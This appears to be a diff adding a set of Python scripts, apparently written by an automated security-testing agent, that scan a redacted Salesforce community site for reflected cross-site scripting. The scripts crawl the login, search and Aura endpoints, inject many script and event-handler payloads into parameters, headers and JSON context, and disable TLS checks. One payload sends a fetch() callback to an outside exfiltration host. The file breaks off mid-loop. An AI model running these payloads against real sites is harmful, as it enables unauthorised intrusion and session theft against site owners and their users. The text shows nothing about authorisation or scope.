@@ -1,0 +1,1034 @@
+import requests
+
+# Test for reflected XSS in language parameter
+test_payloads = [
+    "en_US'\"<script>alert('XSS')</script>",
+    "en_US<img src=x onerror=alert('XSS')>",
+    "en_US\"><svg/onload=alert('XSS')>",
+    "en_US\"><body onload=alert('XSS')>",
+    "javascript:alert('XSS')",
+    "<script>console.log('XSS')</script>"
+]
+
+for payload in test_payloads:
+    print(f"Testing payload: {payload}")
+    response = requests.get(f"https://[REDACTED].salesforce.com/s/login/?language={payload}", verify=False)
+    
+    # Check if payload is reflected in the response
+    if payload in response.text:
+        print(f"Payload reflected: {payload}")
+        snippet = response.text[response.text.find(payload):response.text.find(payload) + len(payload) + 50]
+        print(f"Context: {snippet}")
+    
+    # Check for potential reflections or sanitization
+    reflection_checks = ["alert", "XSS", "<script", "<img", "onerror", "onload"]
+    for check in reflection_checks:
+        if check in payload and check in response.text:
+            print(f"Term '{check}' from payload found in response")
+
+# Also check for other potential parameters
+print("\nChecking if other parameters might be reflected...")
+test_params = {
+    "error": "<script>console.log('XSS')</script>",
+    "message": "<img src=x onerror=alert('XSS')>",
+    "redirect": "javascript:alert('XSS')",
+    "test": "<svg/onload=alert('XSS')>"
+}
+
+for param, value in test_params.items():
+    response = requests.get(f"https://[REDACTED].salesforce.com/s/login/?{param}={value}", verify=False)
+    if value in response.text:
+        print(f"Parameter '{param}' with value '{value}' is reflected!")
+
+import requests
+import re
+from urllib.parse import urljoin
+
+base_url = "https://[REDACTED].salesforce.com"
+
+# Suppress SSL warnings
+requests.packages.urllib3.disable_warnings()
+
+# Function to extract links from HTML
+def extract_links(html_content, base_url):
+    # Extract links from href attributes
+    href_pattern = re.compile(r'href=[\'"]?([^\'" >]+)')
+    links = href_pattern.findall(html_content)
+    
+    # Extract links from JavaScript redirects
+    js_pattern = re.compile(r'location\.href\s*=\s*[\'"]([^\'"]+)[\'"]')
+    js_links = js_pattern.findall(html_content)
+    
+    # Extract endpoint paths
+    path_pattern = re.compile(r'[\'"/]([a-zA-Z0-9_\-/]+\.(aspx|php|jsp|html|do|action))[\'"]')
+    paths = path_pattern.findall(html_content)
+    
+    # Combine all found links
+    all_links = links + js_links + [p[0] for p in paths]
+    
+    # Normalize links
+    normalized_links = []
+    for link in all_links:
+        if link.startswith('http'):
+            normalized_links.append(link)
+        else:
+            normalized_links.append(urljoin(base_url, link))
+    
+    return list(set(normalized_links))
+
+# Function to check for potential XSS
+def check_for_xss(url):
+    print(f"Checking URL: {url}")
+    try:
+        response = requests.get(url, verify=False, timeout=5)
+        
+        # Look for potential XSS vectors (input fields, etc.)
+        input_fields = re.findall(r'<input[^>]*>', response.text)
+        for field in input_fields:
+            name_match = re.search(r'name=[\'"]([^\'"]+)[\'"]', field)
+            if name_match:
+                print(f"  Found input field: {name_match.group(1)}")
+        
+        # Look for URL parameters in JavaScript
+        js_params = re.findall(r'([\w\-]+)=[\'"]\s*\+\s*[a-zA-Z0-9_\.]+', response.text)
+        if js_params:
+            print(f"  Potential dynamic parameters in JS: {js_params}")
+        
+        # Look for error messages or debug information
+        if "error" in response.text.lower() or "exception" in response.text.lower():
+            print(f"  Page might contain error messages")
+        
+        return extract_links(response.text, url)
+    except Exception as e:
+        print(f"  Error processing {url}: {e}")
+        return []
+
+# Start with the login page
+pages_to_check = [f"{base_url}/s/login/?language=en_US"]
+checked_urls = set()
+
+# Also try some common paths that might exist
+additional_paths = [
+    "/s/register",
+    "/s/forgot-password",
+    "/s/reset-password",
+    "/s/contactsupport",
+    "/s/help",
+    "/s/support",
+    "/s/community",
+    "/s/feedback",
+    "/s/search"
+]
+
+for path in additional_paths:
+    pages_to_check.append(f"{base_url}{path}")
+
+# Limited crawl to discover potential XSS vectors
+max_pages = 10
+page_count = 0
+
+while pages_to_check and page_count < max_pages:
+    current_url = pages_to_check.pop(0)
+    if current_url in checked_urls:
+        continue
+    
+    checked_urls.add(current_url)
+    page_count += 1
+    
+    # Try to find links and potential XSS vectors
+    new_links = check_for_xss(current_url)
+    
+    # Add new links to check
+    for link in new_links:
+        if link not in checked_urls and link not in pages_to_check and base_url in link:
+            pages_to_check.append(link)
+
+print("\nSummary:")
+print(f"Checked {len(checked_urls)} pages")
+print("Checked URLs:")
+for url in checked_urls:
+    print(f"  {url}")
+
+
+import requests
+import re
+from bs4 import BeautifulSoup
+
+# Disable SSL warnings
+requests.packages.urllib3.disable_warnings()
+
+def analyze_login_page():
+    url = "https://[REDACTED].salesforce.com/s/login/?language=en_US"
+    response = requests.get(url, verify=False)
+    
+    print("\n=== Login Page Analysis ===")
+    
+    # Parse HTML
+    soup = BeautifulSoup(response.text, 'html.parser')
+    
+    # Extract form elements
+    print("\n== Form Elements ==")
+    forms = soup.find_all('form')
+    print(f"Found {len(forms)} forms")
+    
+    for i, form in enumerate(forms):
+        print(f"\nForm #{i+1}:")
+        print(f"Action: {form.get('action', 'None')}")
+        print(f"Method: {form.get('method', 'None')}")
+        
+        inputs = form.find_all(['input', 'select', 'textarea'])
+        print(f"Inputs: {len(inputs)}")
+        for inp in inputs:
+            inp_type = inp.get('type', 'N/A')
+            inp_name = inp.get('name', 'N/A')
+            inp_id = inp.get('id', 'N/A')
+            print(f"  - Type: {inp_type}, Name: {inp_name}, ID: {inp_id}")
+    
+    # If no forms were found in the parsed HTML, check the raw HTML for form structures
+    if not forms:
+        form_pattern = re.compile(r'<form[^>]*>.*?</form>', re.DOTALL)
+        raw_forms = form_pattern.findall(response.text)
+        print(f"\nFound {len(raw_forms)} forms in raw HTML")
+        for i, form in enumerate(raw_forms[:2]):  # Limit to first 2 to avoid huge output
+            print(f"\nRaw Form #{i+1} (snippet):")
+            print(form[:200] + "..." if len(form) > 200 else form)
+    
+    # Extract JavaScript
+    print("\n== JavaScript Analysis ==")
+    scripts = soup.find_all('script')
+    print(f"Found {len(scripts)} script tags")
+    
+    for i, script in enumerate(scripts[:3]):  # Limit to first 3 to avoid huge output
+        if script.string:
+            js_content = script.string.strip()
+            if js_content:
+                print(f"\nScript #{i+1} (snippet):")
+                print(js_content[:200] + "..." if len(js_content) > 200 else js_content)
+                
+                # Look for potential XSS vectors in JavaScript
+                potential_vectors = [
+                    r'document\.write\s*\(',
+                    r'\.innerHTML\s*=',
+                    r'eval\s*\(',
+                    r'location\.(?:href|search|hash)',
+                    r'parameter|param|querystring',
+                    r'getParameter\('
+                ]
+                
+                for vector in potential_vectors:
+                    matches = re.findall(vector, js_content)
+                    if matches:
+                        print(f"  - Potential XSS vector: {vector}, found {len(matches)} times")
+    
+    # Look for iframe elements
+    iframes = soup.find_all('iframe')
+    print(f"\nFound {len(iframes)} iframes")
+    for iframe in iframes:
+        print(f"  - Source: {iframe.get('src', 'N/A')}")
+    
+    # Extract potential error message containers
+    error_divs = soup.find_all('div', class_=lambda x: x and ('error' in x.lower() or 'message' in x.lower()))
+    print(f"\nPotential error containers: {len(error_divs)}")
+    for div in error_divs[:3]:  # Limit to first 3
+        print(f"  - ID: {div.get('id', 'N/A')}, Class: {div.get('class', 'N/A')}")
+    
+    # Check for URL parameters being used in the page
+    print("\n== URL Parameters Analysis ==")
+    # Look for the 'language' parameter usage
+    language_usage = re.findall(r'language\s*=\s*[\'"]([^\'"]+)[\'"]', response.text)
+    print(f"Language parameter usage found: {language_usage}")
+    
+    # Look for other parameter patterns in the code
+    param_pattern = re.compile(r'(\w+)\s*=\s*(?:getParameter|urlParams|getUrlParam|getQueryParam)\s*\(\s*[\'"](\w+)[\'"]')
+    param_matches = param_pattern.findall(response.text)
+    if param_matches:
+        print("Potential URL parameter usage in JS:")
+        for var_name, param_name in param_matches:
+            print(f"  - Parameter '{param_name}' assigned to variable '{var_name}'")
+    
+    # Look at the meta tags for potential clues
+    print("\n== Meta Tags ==")
+    meta_tags = soup.find_all('meta')
+    for meta in meta_tags:
+        name = meta.get('name', meta.get('property', 'N/A'))
+        content = meta.get('content', 'N/A')
+        if name != 'N/A' or content != 'N/A':
+            print(f"  - {name}: {content}")
+    
+    # Extract redirects and navigation info
+    redirect_pattern = re.compile(r'(?:location\.href|window\.location|location\.replace)\s*=\s*[\'"]([^\'"]+)[\'"]')
+    redirects = redirect_pattern.findall(response.text)
+    if redirects:
+        print("\n== Redirects Found ==")
+        for redirect in redirects:
+            print(f"  - {redirect}")
+
+    # Check for any error message reflections
+    error_pattern = re.compile(r'(?:showError|displayError|showMessage|errorMessage)\s*\(')
+    error_functions = error_pattern.findall(response.text)
+    if error_functions:
+        print("\n== Error Handling Functions ==")
+        print(f"Found {len(error_functions)} potential error handling function calls")
+
+analyze_login_page()
+
+
+import requests
+import urllib.parse
+import re
+from bs4 import BeautifulSoup
+
+# Disable SSL warnings
+requests.packages.urllib3.disable_warnings()
+
+def test_error_reflection():
+    base_url = "https://[REDACTED].salesforce.com"
+    
+    # Test various endpoints with potential XSS payloads
+    test_endpoints = [
+        "/s/login",
+        "/s/search",
+        "/s/register",
+        "/s/forgot-password"
+    ]
+    
+    # XSS test payloads
+    xss_payloads = [
+        "<script>alert('XSS')</script>",
+        "<img src=x onerror=alert('XSS')>",
+        "<svg/onload=alert('XSS')>",
+        "javascript:alert('XSS')",
+        "';alert('XSS');//",
+        "\"><script>console.log('XSS')</script>",
+        "<body onload=alert('XSS')>",
+        "'-confirm('XSS')-'"
+    ]
+    
+    # Parameters to test
+    test_params = [
+        "q",
+        "search",
+        "query",
+        "term",
+        "keyword",
+        "error",
+        "message",
+        "redirect",
+        "returnUrl",
+        "startURL",
+        "retURL",
+        "state",
+        "code"
+    ]
+    
+    print("Testing for XSS reflection in error messages and parameters...")
+    
+    for endpoint in test_endpoints:
+        print(f"\nChecking endpoint: {endpoint}")
+        for param in test_params:
+            for payload in xss_payloads:
+                # Encode the payload for URL
+                encoded_payload = urllib.parse.quote_plus(payload)
+                test_url = f"{base_url}{endpoint}?{param}={encoded_payload}"
+                
+                try:
+                    response = requests.get(test_url, verify=False, timeout=5)
+                    
+                    # Check if the payload is reflected in the response
+                    # We'll check both encoded and decoded versions
+                    reflection_found = False
+                    if payload in response.text:
+                        print(f"  [!] Raw payload reflected in {param}: {payload}")
+                        reflection_found = True
+                    elif encoded_payload in response.text:
+                        print(f"  [!] Encoded payload reflected in {param}: {encoded_payload}")
+                        reflection_found = True
+                    
+                    # If reflection found, get the context
+                    if reflection_found:
+                        # Try to locate where the payload was reflected
+                        soup = BeautifulSoup(response.text, 'html.parser')
+                        # Look for elements containing the payload
+                        for element in soup.find_all(string=re.compile(re.escape(payload), re.IGNORECASE)):
+                            parent = element.parent
+                            print(f"    Context: <{parent.name} {' '.join([f'{k}=\"{v}\"' for k, v in parent.attrs.items()])}> ... {element} ... </{parent.name}>")
+                
+                except Exception as e:
+                    print(f"  Error accessing {test_url}: {e}")
+    
+    # Also test the referer header for reflection
+    print("\nTesting Referer header reflection...")
+    xss_headers = {"Referer": "<script>alert('XSS')</script>"}
+    for endpoint in test_endpoints:
+        try:
+            response = requests.get(f"{base_url}{endpoint}", headers=xss_headers, verify=False, timeout=5)
+            if "<script>alert('XSS')</script>" in response.text:
+                print(f"  [!] XSS payload reflected in Referer header at {endpoint}")
+        except Exception as e:
+            print(f"  Error testing Referer header at {endpoint}: {e}")
+    
+    # Check for search functionality specifically
+    print("\nTesting search functionality...")
+    search_url = f"{base_url}/s/search"
+    try:
+        for payload in xss_payloads[:3]:  # Use just a few payloads to keep it quick
+            encoded_payload = urllib.parse.quote_plus(payload)
+            response = requests.get(f"{search_url}?q={encoded_payload}", verify=False, timeout=5)
+            
+            if payload in response.text:
+                print(f"  [!] Search query reflects our payload: {payload}")
+                # Try to understand the context
+                if "<input" in response.text:
+                    input_pattern = re.compile(r'<input[^>]*value=[\'"]([^\'"]*' + re.escape(payload) + r'[^\'"]*)[\'"][^>]*>')
+                    input_matches = input_pattern.findall(response.text)
+                    if input_matches:
+                        print(f"    Payload is reflected in input value: {input_matches[0]}")
+    except Exception as e:
+        print(f"  Error testing search functionality: {e}")
+    
+    # Test for JSON endpoints that might reflect input
+    print("\nTesting potential JSON endpoints...")
+    json_endpoints = [
+        "/s/api/search",
+        "/s/services/search",
+        "/s/api/query"
+    ]
+    
+    for endpoint in json_endpoints:
+        try:
+            # Try both GET and POST
+            for payload in xss_payloads[:2]:  # Limit payloads for brevity
+                # GET request with parameter
+                get_response = requests.get(f"{base_url}{endpoint}?q={urllib.parse.quote_plus(payload)}", 
+                                        verify=False, timeout=5)
+                
+                if 'application/json' in get_response.headers.get('Content-Type', ''):
+                    if payload in get_response.text:
+                        print(f"  [!] JSON endpoint {endpoint} reflects payload via GET: {payload}")
+                
+                # POST request with JSON body
+                post_data = {"query": payload, "searchTerm": payload}
+                post_response = requests.post(f"{base_url}{endpoint}", 
+                                         json=post_data,
+                                         verify=False, timeout=5)
+                
+                if 'application/json' in post_response.headers.get('Content-Type', ''):
+                    if payload in post_response.text:
+                        print(f"  [!] JSON endpoint {endpoint} reflects payload via POST: {payload}")
+        except Exception as e:
+            # Just continue if endpoint doesn't exist
+            pass
+
+test_error_reflection()
+
+import requests
+import urllib.parse
+import re
+from bs4 import BeautifulSoup
+
+# Disable SSL warnings
+requests.packages.urllib3.disable_warnings()
+
+def test_salesforce_specific_vectors():
+    base_url = "https://[REDACTED].salesforce.com"
+    
+    # Salesforce-specific endpoints to check
+    sf_endpoints = [
+        "/s/",
+        "/services/data/",
+        "/services/apexrest/",
+        "/services/oauth2/",
+        "/apex/",
+        "/visualforce/",
+        "/lightning/",
+        "/s/sfsites/",
+        "/sfc/",
+        "/servlet/",
+        "/s/login/",
+        "/s/register/",
+        "/s/forgot-password/",
+        "/s/sfsites/aura",
+        # Community-specific endpoints
+        "/s/contactsupport",
+        "/s/article/",
+        "/s/topic/",
+        "/s/question/",
+        "/s/contact-support",
+        "/s/global-search/",
+        # Add more common Salesforce Community endpoints
+        "/s/feed/",
+        "/s/detail/",
+        "/s/resources"
+    ]
+    
+    # Salesforce-specific parameters
+    sf_params = [
+        "retURL",
+        "startURL",
+        "referer",
+        "refURL",
+        "cancelURL",
+        "redirectURL",
+        "redirect",
+        "target",
+        "inline",
+        "display",
+        "sourceURL",
+        "id",
+        "scontrolCaching",
+        "isdtp",
+        "view",
+        "isAjaxRequest",
+        "aura.context",
+        "aura.token"
+    ]
+    
+    # XSS test payloads
+    xss_payloads = [
+        "<script>console.log('XSS')</script>",
+        "<img src=x onerror=console.log('XSS')>",
+        "<svg/onload=console.log('XSS')>",
+        "javascript:console.log('XSS')",
+        "\"><script>console.log('XSS')</script><\"",
+        "';console.log('XSS');//"
+    ]
+    
+    print("Testing Salesforce-specific endpoints and parameters...")
+    
+    # Test each endpoint
+    for endpoint in sf_endpoints:
+        full_url = f"{base_url}{endpoint}"
+        print(f"\nChecking endpoint: {full_url}")
+        
+        try:
+            response = requests.get(full_url, verify=False, timeout=5)
+            status = response.status_code
+            
+            print(f"  Status: {status}")
+            
+            # If accessible, check the content type
+            if status == 200 or status == 301 or status == 302:
+                content_type = response.headers.get('Content-Type', 'Unknown')
+                print(f"  Content-Type: {content_type}")
+                
+                # If it's an HTML page, look for forms or input fields
+                if 'text/html' in content_type:
+                    soup = BeautifulSoup(response.text, 'html.parser')
+                    forms = soup.find_all('form')
+                    print(f"  Forms found: {len(forms)}")
+                    
+                    inputs = soup.find_all(['input', 'textarea'])
+                    print(f"  Input fields found: {len(inputs)}")
+                    
+                    for input_field in inputs:
+                        input_name = input_field.get('name', '')
+                        input_id = input_field.get('id', '')
+                        input_type = input_field.get('type', '')
+                        if input_name or input_id:
+                            print(f"    Input: name='{input_name}', id='{input_id}', type='{input_type}'")
+            
+            # Test for parameter reflection
+            for param in sf_params:
+                for payload in xss_payloads[:2]:  # Limit to first 2 payloads for brevity
+                    test_url = f"{full_url}?{param}={urllib.parse.quote_plus(payload)}"
+                    
+                    try:
+                        param_response = requests.get(test_url, verify=False, timeout=5)
+                        
+                        # Check if payload is reflected
+                        if payload in param_response.text:
+                            print(f"  [!] Parameter '{param}' reflects payload: {payload}")
+                            
+                            # Try to determine context
+                            reflection_context = param_response.text[param_response.text.find(payload)-50:param_response.text.find(payload)+len(payload)+50]
+                            print(f"    Context: ...{reflection_context}...")
+                    except Exception as e:
+                        # Just continue if there's an error
+                        continue
+        
+        except Exception as e:
+            print(f"  Error accessing {full_url}: {e}")
+    
+    # Test for additional reflection vectors in login
+    print("\nTesting login page for XSS reflection...")
+    login_url = f"{base_url}/s/login/"
+    
+    # Test standard URL parameters
+    test_params = {
+        "language": "<script>console.log('XSS')</script>",
+        "startURL": "javascript:console.log('XSS')",
+        "retURL": "<img src=x onerror=console.log('XSS')>",
+        "message": "<svg/onload=console.log('XSS')>"
+    }
+    
+    for param, payload in test_params.items():
+        test_url = f"{login_url}?{param}={urllib.parse.quote_plus(payload)}"
+        try:
+            response = requests.get(test_url, verify=False, timeout=5)
+            
+            if payload in response.text:
+                print(f"  [!] Parameter '{param}' reflects payload: {payload}")
+                
+                # Search for reflection pattern to understand context
+                soup = BeautifulSoup(response.text, 'html.parser')
+                for tag in soup.find_all(string=re.compile(re.escape(payload))):
+                    parent = tag.parent
+                    print(f"    Context: <{parent.name}...>{tag}...")
+        except Exception as e:
+            print(f"  Error testing {param}: {e}")
+    
+    # Test for CORS and other security headers
+    print("\nChecking for security headers...")
+    security_headers = [
+        "Content-Security-Policy",
+        "X-XSS-Protection",
+        "X-Content-Type-Options",
+        "X-Frame-Options",
+        "Strict-Transport-Security"
+    ]
+    
+    response = requests.get(base_url, verify=False)
+    for header in security_headers:
+        if header in response.headers:
+            print(f"  {header}: {response.headers[header]}")
+        else:
+            print(f"  {header}: Not present")
+
+test_salesforce_specific_vectors()
+
+
+import requests
+import json
+import urllib.parse
+import re
+
+# Disable SSL warnings
+requests.packages.urllib3.disable_warnings()
+
+def test_aura_endpoints():
+    base_url = "https://[REDACTED].salesforce.com"
+    
+    print("Testing Aura/Lightning framework endpoints for XSS...")
+    
+    # Common Aura framework endpoints
+    aura_endpoints = [
+        "/s/sfsites/aura",
+        "/s/sfsites/aura?r=1",
+        "/s/sfsites/aura?aura.format=HTML",
+        "/s/sfsites/aura?aura.format=JSON",
+        "/s/sfsites/aura?aura.mode=PROD",
+        "/s/sfsites/aura?aura.format=HTML&aura.mode=PROD"
+    ]
+    
+    # XSS payloads
+    xss_payloads = [
+        "<script>console.log('XSS')</script>",
+        "<img src=x onerror=console.log('XSS')>",
+        "javascript:console.log('XSS')",
+        "{!<script>console.log('XSS')</script>}",
+        "'+alert('XSS')+'",
+        "');console.log('XSS');('"
+    ]
+    
+    # Aura-specific parameters to test
+    aura_params = [
+        "aura.context",
+        "aura.token",
+        "aura.component",
+        "aura.dependency",
+        "aura.method",
+        "aura.pageURI",
+        "message",
+        "aura.error",
+        "aura.name",
+        "aura.value",
+        "fwuid",
+        "aura.tag",
+        "aura.event",
+        "r",
+        "aura.lastmod",
+        "aura.flavor"
+    ]
+    
+    # Check if Aura endpoints are accessible
+    for endpoint in aura_endpoints:
+        full_url = f"{base_url}{endpoint}"
+        print(f"\nTesting endpoint: {full_url}")
+        
+        try:
+            response = requests.get(full_url, verify=False, timeout=10)
+            status_code = response.status_code
+            content_type = response.headers.get('Content-Type', 'Unknown')
+            
+            print(f"  Status: {status_code}")
+            print(f"  Content-Type: {content_type}")
+            
+            # If accessible, look for interesting data
+            if status_code == 200:
+                if 'application/json' in content_type:
+                    try:
+                        json_data = response.json()
+                        print("  Endpoint returns JSON data")
+                        
+                        # Look for component definitions or other interesting data
+                        if 'component' in str(json_data) or 'descriptor' in str(json_data):
+                            print("  Contains component definitions")
+                        
+                        # Extract component names if available
+                        component_pattern = r'"descriptor":"([^"]+)"'
+                        components = re.findall(component_pattern, str(json_data))
+                        if components:
+                            print(f"  Found {len(components)} component descriptors")
+                            for comp in components[:5]:  # Show first 5
+                                print(f"    - {comp}")
+                    except:
+                        print("  Invalid JSON response")
+                
+                # Look for Aura/Lightning framework signatures
+                framework_indicators = [
+                    'aura_prod.js',
+                    'lightning',
+                    'sfdc',
+                    'forceCommunity',
+                    'experienceforce',
+                    'auraFW',
+                    'ltng'
+                ]
+                
+                for indicator in framework_indicators:
+                    if indicator in response.text:
+                        print(f"  Contains framework indicator: {indicator}")
+        
+        except Exception as e:
+            print(f"  Error accessing {full_url}: {e}")
+    
+    # Test Aura component loading with potentially vulnerable parameters
+    print("\nTesting Aura component loading with different parameters...")
+    
+    # Test each parameter with XSS payloads
+    for param in aura_params:
+        for payload in xss_payloads[:3]:  # Use first 3 payloads to keep it manageable
+            encoded_payload = urllib.parse.quote_plus(payload)
+            test_url = f"{base_url}/s/sfsites/aura?{param}={encoded_payload}"
+            
+            try:
+                response = requests.get(test_url, verify=False, timeout=10)
+                
+                # Check if payload is reflected
+                if payload in response.text:
+                    print(f"  [!] Parameter '{param}' reflects payload: {payload}")
+                    
+                    # Try to determine context
+                    reflection_context = response.text[response.text.find(payload)-50:response.text.find(payload)+len(payload)+50]
+                    print(f"    Context: ...{reflection_context}...")
+            except Exception as e:
+                # Just continue if there's an error
+                continue
+    
+    # Attempt to find and test Lightning Out URLs
+    print("\nLooking for Lightning Out endpoints...")
+    try:
+        response = requests.get(f"{base_url}/s/login/", verify=False)
+        # Look for Lightning Out URLs
+        lightning_out_pattern = r'/lightning/lightning\.out\.js'
+        lightning_matches = re.findall(lightning_out_pattern, response.text)
+        
+        if lightning_matches:
+            print("  Found Lightning Out references")
+            
+            # Check Lightning Out endpoints
+            lightning_out_url = f"{base_url}/lightning/lightning.out.js"
+            response = requests.get(lightning_out_url, verify=False)
+            if response.status_code == 200:
+                print(f"  Lightning Out JS is accessible at {lightning_out_url}")
+                
+                # Check for possible injection points in Lightning Out
+                lo_params = ["lss", "app", "component", "componentDef", "callback", "placeholder"]
+                for param in lo_params:
+                    for payload in xss_payloads[:1]:  # Just use first payload
+                        test_url = f"{base_url}/lightning/lightning.out.js?{param}={urllib.parse.quote_plus(payload)}"
+                        try:
+                            response = requests.get(test_url, verify=False)
+                            if payload in response.text:
+                                print(f"  [!] Lightning Out parameter '{param}' reflects payload: {payload}")
+                        except:
+                            continue
+    except Exception as e:
+        print(f"  Error checking for Lightning Out: {e}")
+    
+    # Try some specific Aura context manipulations
+    print("\nTesting Aura context manipulation...")
+    aura_context = {
+        "mode": "PROD",
+        "fwuid": "fakefwuid<script>console.log('XSS')</script>",
+        "app": "fakapp<img src=x onerror=console.log('XSS')>",
+        "loaded": {},
+        "dn": [],
+        "globals": {},
+        "uad": False
+    }
+    
+    context_encoded = urllib.parse.quote_plus(json.dumps(aura_context))
+    test_url = f"{base_url}/s/sfsites/aura?aura.context={context_encoded}"
+    
+    try:
+        response = requests.get(test_url, verify=False, timeout=10)
+        
+        if "<script>" in response.text or "onerror=" in response.text:
+            print("  [!] Aura context parameter reflects our XSS payload")
+            # Check response for evidence of successful injection
+            for payload in ["<script>console.log('XSS')", "<img src=x onerror=console.log('XSS')"]:
+                if payload in response.text:
+                    print(f"    Found reflected payload: {payload}")
+    except Exception as e:
+        print(f"  Error testing Aura context: {e}")
+
+test_aura_endpoints()
+
+import requests
+from urllib.parse import quote_plus
+import re
+
+# Disable SSL warnings
+requests.packages.urllib3.disable_warnings()
+
+def test_aura_payloads():
+    base_url = "https://[REDACTED].salesforce.com"
+    
+    # First, let's check if we can get a different content type with other params
+    aura_format_variations = [
+        "?aura.format=HTML",
+        "?aura.format=JSON",
+        "?aura.format=JS",
+        "?aura.format=JAVASCRIPT",
+        "?aura.format=XML",
+        "?aura.tag=test&aura.format=HTML",
+        "?aura.tag=test&aura.format=JSON"
+    ]
+    
+    print("Testing Aura format variations:")
+    for variation in aura_format_variations:
+        url = f"{base_url}/s/sfsites/aura{variation}"
+        try:
+            response = requests.get(url, verify=False)
+            content_type = response.headers.get('Content-Type', 'Unknown')
+            print(f"  {variation} => Content-Type: {content_type}")
+        except Exception as e:
+            print(f"  Error with {variation}: {e}")
+    
+    # Now let's test different XSS payloads with aura.tag
+    xss_payloads = [
+        "<img src=x onerror=console.log('XSS')>",
+        "<svg onload=console.log('XSS')>",
+        "<body onload=console.log('XSS')>",
+        "<iframe onload=console.log('XSS')>",
+        "'+alert('XSS')+'",
+        "\"><img src=x onerror=console.log('XSS')>",
+        "<script>fetch('//d00sdb4td7cs74appav0tzwcfshq9pprr.xfil.xbow.ltd')</script>",
+        "<img src=1 href=1 onerror=\"javascript:console.log('XSS')\">"
+    ]
+    
+    print("\nTesting different XSS payloads with aura.tag:")
+    for payload in xss_payloads:
+        encoded_payload = quote_plus(payload)
+        url = f"{base_url}/s/sfsites/aura?aura.tag={encoded_payload}"
+        
+        try:
+            response = requests.get(url, verify=False)
+            content_type = response.headers.get('Content-Type', 'Unknown')
+            
+            print(f"  Payload: {payload}")
+            print(f"  Content-Type: {content_type}")
+            
+            # Check if our payload is in the response
+            if payload in response.text:
+                print(f"  [+] Payload is reflected without encoding!")
+            elif re.search(re.escape(payload.replace("'", "").replace('"', '')), response.text, re.IGNORECASE):
+                print(f"  [+] Payload content is reflected (without quotes)!")
+                
+            # Show a snippet of the response
+            start_idx = response.text.find(payload) if payload in response.text else 0
+            if start_idx > 0:
+                snippet = response.text[max(0, start_idx-20):min(len(response.text), start_idx+len(payload)+20)]
+            else:
+                snippet = response.text[:100] if len(response.text) > 100 else response.text
+            
+            print(f"  Response snippet: {snippet}")
+            print()
+        except Exception as e:
+            print(f"  Error with payload {payload}: {e}")
+    
+    # Test different parameter combinations
+    print("\nTesting parameter combinations:")
+    param_combinations = [
+        "?aura.tag=<script>console.log('XSS')</script>&aura.format=HTML",
+        "?aura.tag=<script>console.log('XSS')</script>&aura.format=JSON",
+        "?aura.tag=<script>console.log('XSS')</script>&aura.mode=PROD",
+        "?aura.tag=<script>console.log('XSS')</script>&aura.context={}"
+    ]
+    
+    for combo in param_combinations:
+        url = f"{base_url}/s/sfsites/aura{combo}"
+        
+        try:
+            response = requests.get(url, verify=False)
+            content_type = response.headers.get('Content-Type', 'Unknown')
+            
+            print(f"  {combo}")
+            print(f"  Content-Type: {content_type}")
+            
+            if "<script>" in response.text:
+                print("  [+] Script tag is present in response!")
+                
+            # Show a snippet of the response
+            snippet = response.text[:100] if len(response.text) > 100 else response.text
+            print(f"  Response snippet: {snippet}")
+            print()
+        except Exception as e:
+            print(f"  Error with combination {combo}: {e}")
+    
+    # Try other endpoints that might process aura.tag
+    print("\nTesting other endpoints with aura.tag:")
+    other_endpoints = [
+        "/s/sfsites/l/",
+        "/s/sfsites/c/",
+        "/s/",
+        "/lightning/",
+        "/s/sfsites/aura/Bootstrap.js",
+        "/s/sfsites/bootstrap"
+    ]
+    
+    for endpoint in other_endpoints:
+        url = f"{base_url}{endpoint}?aura.tag=<script>console.log('XSS')</script>"
+        
+        try:
+            response = requests.get(url, verify=False)
+            content_type = response.headers.get('Content-Type', 'Unknown')
+            
+            print(f"  {endpoint}")
+            print(f"  Status: {response.status_code}")
+            print(f"  Content-Type: {content_type}")
+            
+            if "<script>" in response.text:
+                print("  [+] Script tag is present in response!")
+                
+            # Show a snippet of the response
+            snippet = response.text[:100] if len(response.text) > 100 else response.text
+            print(f"  Response snippet: {snippet}")
+            print()
+        except Exception as e:
+            print(f"  Error with endpoint {endpoint}: {e}")
+
+test_aura_payloads()
+
+
+import requests
+from urllib.parse import quote_plus
+import json
+
+# Disable SSL warnings
+requests.packages.urllib3.disable_warnings()
+
+def test_json_context_xss():
+    base_url = "https://[REDACTED].salesforce.com"
+    
+    # Payloads designed to break out of JSON context
+    json_context_payloads = [
+        # Basic img onerror (might work if JSON parsing allows certain HTML)
+        '"><img src=x onerror=console.log(\'XSS\')>',
+        
+        # JSON-specific payloads with various escaping techniques
+        '\\"><img src=x onerror=console.log(\'XSS\')>',
+        '","a":"<img src=x onerror=console.log(\'XSS\')>',
+        '"}}</script><img src=x onerror=console.log(\'XSS\')>',
+        
+        # Various event handlers
+        '"><svg onload=console.log(\'XSS\')>',
+        '"><body onload=console.log(\'XSS\')>',
+        
+        # Try breaking with proper JSON format
+        '\\"};alert(\'XSS\');//',
+        '\\"}));console.log(\'XSS\');//',
+        
+        # HTML entities that might get decoded
+        '"><img src=x onerror=&#99;&#111;&#110;&#115;&#111;&#108;&#101;&#46;&#108;&#111;&#103;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>',
+        
+        # Null byte and other special characters
+        '\\u0000"><img src=x onerror=console.log(\'XSS\')>',
+        
+        # Unicode alternatives
+        '"><ſcript>console.log(\'XSS\')</ſcript>',
+        
+        # Data URI with JavaScript
+        'data:text/html,<script>console.log(\'XSS\')</script>',
+        
+        # Try without quotes, might help with escaping in JSON
+        '><img src=x onerror=console.log(XSS)>'
+    ]
+    
+    # For each payload, test with different format parameters
+    format_values = ["JSON", "HTML", "JS"]
+    
+    results = []
+    for payload in json_context_payloads:
+        encoded_payload = quote_plus(payload)
+        
+        for format_val in format_values:
+            url = f"{base_url}/s/sfsites/aura?aura.tag={encoded_payload}&aura.format={format_val}"
+            
+            try:
+                response = requests.get(url, verify=False, timeout=5)
+                content_type = response.headers.get('Content-Type', 'Unknown')
+                
+                # Check if payload is in response without being escaped
+                reflected = False
+                if payload in response.text:
+                    reflected = True
+                    
+                # Store result
+                result = {
+                    "payload": payload,
+                    "format": format_val,
+                    "url": url,
+                    "content_type": content_type,
+                    "reflected": reflected,
+                    "response_snippet": response.text[:200] if len(response.text) > 200 else response.text
+                }
+                results.append(result)
+                
+            except Exception as e:
+                print(f"Error with payload {payload} and format {format_val}: {str(e)}")
+    
+    # Print the results in an organized way
+    print(f"Tested {len(json_context_payloads)} payloads with {len(format_values)} different formats.")
+    
+    for result in results:
+        if result["reflected"]:
+            print("\n" + "="*50)
